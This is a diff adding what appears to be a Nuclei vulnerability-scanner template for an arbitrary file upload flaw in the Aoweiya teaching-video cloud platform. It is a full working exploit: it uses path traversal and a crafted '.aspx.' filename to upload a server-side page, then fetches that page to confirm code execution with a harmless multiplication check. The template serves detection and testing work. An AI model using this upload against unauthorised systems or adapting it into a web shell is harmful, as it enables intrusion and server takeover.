@@ -1,0 +1,51 @@
+id: poc-yaml-ava-platform-uploadfile
+info:
+  name: 奥威亚 教学视频应用云平台 UploadFile.aspx任意文件上传
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+http:
+  - raw:
+      - |
+        POST /Services/WeikeCutOut/UploadFile.aspx?VideoGuid=/../../ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymWx2sFyYKYdxav6y
+
+        ------WebKitFormBoundarymWx2sFyYKYdxav6y
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.aspx."
+        Content-Type: image/jpeg
+        
+        <%@ Page Language="C#"%><% Response.Write({{t1}} * {{t2}}); %>
+        ------WebKitFormBoundarymWx2sFyYKYdxav6y--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Success"
+    extractors:
+      - type: regex
+        name: uploaded_file
+        part: body
+        regex:
+          - "{{filename}}\\.aspx"
+        internal: true
+  - raw:
+      - |
+        GET /{{filename}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t3}}"
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  t1: "{{rand_int(100, 1000)}}"
+  t2: "{{rand_int(100, 1000)}}"
+  t3: "{{to_number(t1) * to_number(t2)}}"
